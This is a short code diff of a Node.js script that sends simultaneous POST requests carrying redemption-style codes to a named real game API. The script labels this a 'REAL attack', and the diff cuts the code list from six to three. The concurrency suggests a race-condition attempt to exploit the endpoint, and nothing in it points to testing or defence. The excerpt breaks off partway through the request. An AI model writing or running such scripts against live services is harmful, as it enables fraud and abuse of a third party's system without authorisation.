@@ -1,12 +1,12 @@
 const axios = require('axios');
 
 const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
-const CODES = ['ABC21', 'ABC22', 'ABC23', 'ABC24', 'ABC25', 'ABC110'];
+const CODES = ['ABC21', 'ABC22', 'ABC23'];
 
 async function attack() {
     console.log(`🚀 Starting REAL attack on ${TARGET_URL} with codes: ${CODES.join(', ')}`);
     
-    // Tạo 6 request đồng thời
+    // Tạo 3 request đồng thời
     const requests = CODES.map(code => {
         return axios.post(TARGET_URL, {
             code: code,
